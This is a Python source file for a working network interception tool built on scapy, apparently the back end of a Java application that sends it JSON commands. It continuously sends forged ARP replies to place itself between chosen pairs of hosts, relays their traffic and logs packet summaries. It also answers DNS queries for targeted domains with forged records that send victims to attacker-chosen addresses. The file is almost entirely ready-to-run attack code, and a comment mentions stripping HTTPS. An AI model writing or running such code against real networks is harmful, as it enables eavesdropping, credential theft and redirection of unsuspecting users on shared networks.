import sys
import json
import threading
import time
from scapy.all import Raw, IP, Ether, send, sniff, getmacbyip, conf, get_if_hwaddr, ARP, sendp, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, get_if_addr
import copy
from http.server import BaseHTTPRequestHandler, HTTPServer
import socket

targets = dict()
targets_lock = threading.Lock()

dns_targets = dict()
dns_targets_lock = threading.Lock()
is_running = True

attacker_mac = get_if_hwaddr(conf.iface).lower()
attacker_ip = get_if_addr(conf.iface)

# TODO: How long will the key value pairs stored in here hold? When are they expired and should we check again?
mac_cache = {}  # Cache to store resolved IP-MAC pairs

spoof_cooldown_in_sec = 1


def get_right_order(val1: str, val2: str):
    if val1 < val2:
        return val1, val2
    else:
        return val2, val1


# Prints a json info message that java can pick up and display to the logger.
def log_info(msg):
    print(json.dumps({"type": "info", "info": msg}), flush=True)


# Prints a json error message that java can pick up and display to the logger.
def log_error(msg):
    print(json.dumps({"type": "error", "error": msg}), flush=True)


# Returns the router's IP if the given ip is not on the local network, otherwise returns input as output
def router_if_offnet(ip: str) -> str:
    _, _, gateway = conf.route.route(ip)[:3]
    return ip if gateway == "0.0.0.0" else gateway


def handle_incoming_packet(packet):
    if not packet.haslayer(Ether) or not packet.haslayer(IP):
        return
    src_ip = packet[IP].src  # Could be an ip outside or inside the network
    dst_mac = packet[Ether].dst.lower()  # Most probably just the attacker's mac address
    dst_ip = packet[IP].dst  # Could be an ip outside or inside the network

    # Only accept packages that come in
    if not dst_mac == attacker_mac:
        return

    # router_if_offnet changes ip address to router ip address if the ip address comes from somewhere
    # outside the local network
    src_target_ip = router_if_offnet(src_ip)
    dst_target_ip = router_if_offnet(dst_ip)
    ip1, ip2 = get_right_order(src_target_ip, dst_target_ip)
    with targets_lock:
        holds = targets.get(ip1) == ip2
    if holds:
        # Update to the actual destination mac address
        dst_mac = get_mac(dst_target_ip)
        if dst_mac is None:
            return

        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
            domain = packet[DNSQR].qname
            with dns_targets_lock:
                is_domain_in_targets = domain.decode().rstrip('.').lower() in dns_targets
                redirect_ip = dns_targets.get(domain.decode().rstrip('.').lower())
            if is_domain_in_targets:
                dns_spoof(packet, redirect_ip)
            else:
                redirect_packet(dst_mac, packet)
                # Detect HTTPS (port 443) and strip to HTTP
        else:
            redirect_packet(dst_mac, packet)

        print_packet_in_json(packet)


def dns_spoof(packet, redirect_ip):
    domain = packet[DNSQR].qname
    ether = Ether(src=attacker_mac, dst=packet[Ether].src)

    ip = IP(src=packet[IP].dst, dst=packet[IP].src, ttl=64)
    udp = UDP(sport=53, dport=packet[UDP].sport)

    dns = DNS(
        id=packet[DNS].id,
        qr=1, aa=1, ra=1,
        qd=packet[DNS].qd,
        an=DNSRR(rrname=domain, ttl=300, rdata=redirect_ip),
        ancount=1
    )

    del ip.len, ip.chksum, udp.len, udp.chksum
    sendp(ether/ip/udp/dns, iface=conf.iface, verbose=False)


# Creates a new packet with the attacker's mac address
# as source and the specified destination as destination and also sends it.
def redirect_packet(destination, packet):
    new_packet = copy.deepcopy(packet)
    new_packet[Ether].src = attacker_mac.lower()
    new_packet[Ether].dst = destination
    sendp(new_packet, iface=conf.iface, verbose=False)


# Nicely divides up the packet and writes it in json format and lets java know
def print_packet_in_json(packet):
    info = {
        "type": "packet",
        "summary": packet.summary(),
    }
    print(json.dumps(info), flush=True)


# Continuously spoof every entry in targets
def spoof_loop():
    while is_running:
        with targets_lock:
            for ip1, ip2 in targets.items():
                spoof(ip1, ip2)
        time.sleep(spoof_cooldown_in_sec)


# Tries to get the mac address by retrieving it from the mac cache or by sending an ARP request
def get_mac(ip):
    """Retrieve MAC address for an IP address, using cache if available."""
    if ip not in mac_cache:
        # Resolve MAC address if not cached
        mac = getmacbyip(ip)
        if mac:
            mac_cache[ip] = mac.lower()
        else:
            log_error(f"Failed to resolve MAC address for IP: {ip}")
            return None
    return mac_cache[ip]


# Apply a spoof in both directions: Let ip1 with mac1 think that the attacker's mac address belongs to ip2 and
# let ip2 with mac2 think that the attacker's mac address belongs to ip1
def spoof(ip1, ip2):
    mac1 = get_mac(ip1)
    mac2 = get_mac(ip2)

    if mac1 is None or mac2 is None:
        log_error(f"Failed to spoof {ip1} and {ip2} because one or more mac address could not be resolved")
        return

    arp1 = ARP(op=2, pdst=ip1, psrc=ip2, hwsrc=attacker_mac, hwdst=mac1)
    ether1 = Ether(dst=mac1, src=attacker_mac)
    sendp(ether1/arp1, iface=conf.iface, verbose=False)

    arp2 = ARP(op=2, pdst=ip2, psrc=ip1, hwsrc=attacker_mac, hwdst=mac2)
    ether2 = Ether(dst=mac2, src=attacker_mac)
    sendp(ether2/arp2, iface=conf.iface, verbose=False)


# Constantly sniff packets and pass them to the send_packet_info() function
def sniff_thread():
    sniff(prn=handle_incoming_packet, store=0)


def handle_command(command):
    global is_running
    try:
        data = json.loads(command)
        action = data.get("action")

        if action == "add_target":
            ip1, ip2 = get_right_order(data["ip1"], data["ip2"])
            with targets_lock:
                if not (targets.get(ip1) == ip2):
                    targets[ip1] = ip2
                    log_info(f"Added spoofing pair: {ip1} <-> {ip2}")

        elif action == "remove_target":
            ip1, ip2 = get_right_order(data["ip1"], data["ip2"])
            with targets_lock:
                if targets.get(ip1) == ip2:
                    del targets[ip1]
                    log_info(f"Removed spoofing pair: {ip1} <-> {ip2}")

        elif action == "shutdown":
            is_running = False
            log_info("Shutting down spoofer...")

        elif action == "add_dns_target":
            domainname, ip = data["domainname"], data["ip"]
            with dns_targets_lock:
                dns_targets[domainname] = ip
                log_info(f"Added dns spoof entry ({domainname}, {ip})")

        elif action == "remove_dns_target":
            domainname = data["domainname"]
            with dns_targets_lock:
                del dns_targets[domainname]
                log_info(f"Removed dns spoof entry with domainname {domainname}")

    except Exception as e:
        log_error(f"Failed to handle command: {str(e)}")


def main():
    log_info("Spoofer started.")

    # A thread that continuously sends ARP responses to the targets
    threading.Thread(target=spoof_loop, daemon=True).start()

    threading.Thread(target=sniff_thread, daemon=True).start()

    for line in sys.stdin:
        handle_command(line.strip())
        if not is_running:
            break

    log_info("Spoofer exited.")


if __name__ == "__main__":
    main()
